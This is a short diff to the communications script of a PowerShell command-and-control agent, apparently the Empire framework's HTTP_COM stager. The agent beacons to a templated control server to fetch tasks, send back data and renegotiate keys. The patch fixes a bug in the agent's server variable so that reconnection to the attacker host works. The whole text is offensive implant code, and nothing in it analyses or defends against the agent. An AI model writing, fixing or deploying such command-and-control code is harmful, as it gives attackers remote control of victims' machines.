+++ empire/server/data/agent/stagers/http_com/comms.ps1
@@ -1,6 +1,6 @@
 # Update control servers
-$server = "{{ host }}";
-$Script:ControlServers = @("$server");
+$Script:server = "{{ host }}";
+$Script:ControlServers = @("$Script:server");
 $Script:ServerIndex = 0;
 
 if(-not $IE) {
@@ -39,7 +39,7 @@ $script:GetTask = {
         $script:MissedCheckins += 1
         if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
             # restart key negotiation
-            Start-Negotiate -S "$ser" -SK $SK -UA $ua;
+            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
         }
     }
 };
@@ -75,7 +75,7 @@ $script:SendMessage = {
                 # exception posting data...
                 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                     # restart key negotiation
-                    Start-Negotiate -S "$ser" -SK $SK -UA $ua;
+                    Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
                 }
             }
         }